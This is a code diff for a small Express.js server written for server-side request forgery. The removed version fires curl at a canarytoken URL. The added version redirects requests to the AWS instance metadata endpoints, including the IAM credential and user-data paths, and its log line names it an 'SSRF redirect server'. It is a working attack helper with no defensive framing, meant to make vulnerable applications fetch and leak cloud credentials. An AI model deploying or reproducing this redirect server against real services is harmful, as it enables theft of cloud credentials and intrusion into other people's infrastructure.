@@ -1,26 +1,19 @@
-// ssrf-curl.js
 const express = require("express");
-const { exec } = require("child_process");
 const app = express();
 const PORT = process.env.PORT || 10000;
 
-// رابط canarytoken الخاص فيك
-const TARGET_URL = "http://canarytokens.com/terms/articles/traffic/10vejiikmwbx2tca01zxf62vv/post.jsp";
+const targets = {
+  meta: "http://169.254.169.254/latest/meta-data/",
+  iam: "http://169.254.169.254/latest/meta-data/iam/",
+  userdata: "http://169.254.169.254/latest/user-data/"
+};
 
-app.get("/ssrf/pings", (req, res) => {
-  const cmd = `curl -s ${TARGET_URL}`;
-  exec(cmd, (err, stdout, stderr) => {
-    if (err) {
-      console.error("❌ Error running curl:", err);
-      res.status(500).send("Curl execution failed.");
-      return;
-    }
-
-    console.log("✅ Curl sent to:", TARGET_URL);
-    res.send(`<h2>🔁 Sent curl to: ${TARGET_URL}</h2>`);
-  });
+app.get("/redirect-to/:type", (req, res) => {
+  const target = targets[req.params.type];
+  if (!target) return res.status(404).send("Not found");
+  res.redirect(target); // fast redirect
 });
 
 app.listen(PORT, () => {
-  console.log(`🔥 Server running at http://localhost:${PORT}`);
+  console.log(`🔥 SSRF redirect server on http://localhost:${PORT}`);
 });
